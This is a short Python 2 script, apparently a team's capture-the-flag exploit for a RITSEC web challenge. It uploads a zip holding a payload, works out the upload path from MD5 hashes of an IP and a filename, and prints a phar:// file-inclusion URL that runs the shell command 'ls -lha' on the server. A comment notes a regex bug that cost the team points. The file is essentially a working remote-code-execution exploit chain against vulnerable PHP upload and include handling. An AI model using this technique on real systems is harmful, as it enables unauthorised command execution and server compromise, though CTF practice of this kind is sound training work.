import sys
tries = []
import requests
import re

ips = ["10.0.10.254"]

def create_win(ip, filename):
	import hashlib
	m = hashlib.md5()

	m.update(str(ip))
	md5ip = m.hexdigest()

	m = hashlib.md5()
	m.update(filename)
	keymd5 = m.hexdigest()


	URL = 'http://54.211.94.128:8004/uploads/%s/%s.zip' % (md5ip, keymd5)
	print "Testing IP %s on URL %s" % (ip, URL)

	r = requests.get(URL)
	if r.status_code != 404:
		print "VICTORY!!!"
		print "Doing exploit"
		payload = "http://fun.ritsec.club:8004/index.php?page=phar://uploads/%s/%s.zip/payload&cmd=ls -lha" % (md5ip, keymd5)
		print payload		
		exit()

def upload_file():
	url = 'http://fun.ritsec.club:8004/index.php?page=upload'
	files = {'upload': open('payload.zip', 'rb')}
	r = requests.post(url, files=files)
	resp = r.text
	matches = re.search(r'>(.*).zip', resp).group()[1:] #For those curios. This is the code that was wrong and lost us 300 points and a ~5th place.
	return matches.split(".")[0] #Quick and dirty fix with split just to make it work :D


create_win("10.0.10.254", upload_file())